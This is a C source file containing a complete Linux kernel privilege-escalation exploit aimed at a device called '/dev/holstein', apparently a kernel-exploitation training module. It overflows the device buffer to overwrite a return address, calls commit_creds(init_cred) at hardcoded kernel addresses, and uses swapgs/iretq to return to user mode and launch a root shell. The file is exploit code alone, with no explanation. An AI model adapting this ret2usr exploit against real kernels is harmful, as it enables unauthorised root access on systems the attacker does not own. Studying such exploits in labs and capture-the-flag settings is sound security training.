#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define is_error(c, s)          \
    {                           \
        if ((c)) {              \
            perror((s));        \
            exit(EXIT_FAILURE); \
        }                       \
    }

#define init_cred 0xffffffff824505e0 
#define commit_creds  0xffffffff8108cd90

unsigned long user_cs, user_ss, user_rsp, user_rflags;

static void win() {
    char *argv[] = { "/bin/sh", NULL };
    char *envp[] = { NULL };

    execve("/bin/sh", argv, envp);
}

static void save_state() {
    asm("movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "movq %%rsp, %2\n"
        "pushfq\n"
        "popq %3\n"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_rsp), "=r"(user_rflags)
        :
        : "memory");
}

static void restore_state() {
    asm("swapgs\n"
        "movq %0, 0x20(%%rsp)\n"
        "movq %1, 0x18(%%rsp)\n"
        "movq %2, 0x10(%%rsp)\n"
        "movq %3, 0x08(%%rsp)\n"
        "movq %4, 0x00(%%rsp)\n"
        "iretq\n"
        :
        : "r"(user_ss), "r"(user_rsp), "r"(user_rflags), "r"(user_cs),
          "r"(win));
}

static void lpe() {
    /* ??? */
	void (*cc)(char*) = (void*)(commit_creds);
	cc(init_cred);
	restore_state();
}

int main() {
    int fd;
    char buf[0x500];

    save_state();

    fd = open("/dev/holstein", O_RDWR);
    is_error(fd == -1, "open() failed");

    read(fd, buf, 0x500);
	*(unsigned long*)(buf + 0x400) = lpe;
	write(fd, buf, 0x500);


    return 0;
}
